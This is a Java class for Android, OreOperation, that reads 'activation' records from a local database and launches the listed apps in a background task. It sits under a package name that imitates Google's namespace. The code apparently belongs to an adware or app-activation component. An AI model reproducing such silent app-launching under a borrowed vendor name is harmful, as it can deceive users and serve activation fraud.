package com.google.android.ore;

import java.util.ArrayList;

import android.content.Context;
import android.os.AsyncTask;
import android.text.TextUtils;

import com.google.android.ore.bean.OreGeneral;
import com.google.android.ore.bean.OreItemInfo;
import com.google.android.ore.bean.OreType;
import com.google.android.ore.db.dao.OreGeneralDao;
import com.google.android.ore.db.dao.OreItemInfoDao;
import com.google.android.ore.thinkandroid.L;
import com.google.android.ore.util.ApkUtil;

public class OreOperation {
	private String TAG = OreOperation.class.getSimpleName();
	private Boolean isAliving = false;
	public void doSyncTask(final Context context){
		L.d(TAG, "doSyncTask isAliving : "+isAliving);
		if (isAliving) {
			return;
		}
		isAliving = true;
		new AsyncTask<Object, Object, Object>() {

			@Override
			protected Object doInBackground(Object... params) {
				doTask(context);
				return null;
			}
			@Override
			protected void onPostExecute(Object result) {
				super.onPostExecute(result);
				isAliving = false;
			}
			@Override
			protected void onCancelled() {
				super.onCancelled();
				isAliving = false;
			}
		}.execute();
	}
	private void doTask(Context context){
		ArrayList<OreGeneral> oreGeneralList= OreGeneralDao.get().getOreGeneralActivation();
		if (null != oreGeneralList && oreGeneralList.size() > 0) {
			for (int i = 0; i < oreGeneralList.size(); i++) {
				OreGeneral oreGeneral = oreGeneralList.get(i);
				if (null != oreGeneral) {
					L.d(TAG, "doTask oreGeneral.ore_id : "+oreGeneral.ore_id + " oreGeneral.ore_type "+oreGeneral.ore_type);
					switch (oreGeneral.ore_type) {
					case OreType.ACTIVATION:
						handleActivation(context,oreGeneral);
						break;

					default:
						break;
					}
					OreGeneralDao.get().update(oreGeneral);
				}
			}
		}
	}
	private void handleActivation(Context context,OreGeneral oreGeneral) {
		OreItemInfo oreItem = OreItemInfoDao.get().get(oreGeneral.ore_item_id);
		if (null != oreItem) {
			L.d(TAG, "handleActivation  oreItem.ore_item_id "+oreItem.ore_item_id);
			if (!TextUtils.isEmpty(oreItem.app_package_name)) {
				ApkUtil.openApp(context,oreItem);
			}
			oreGeneral.status = 1;
		}
	}
}
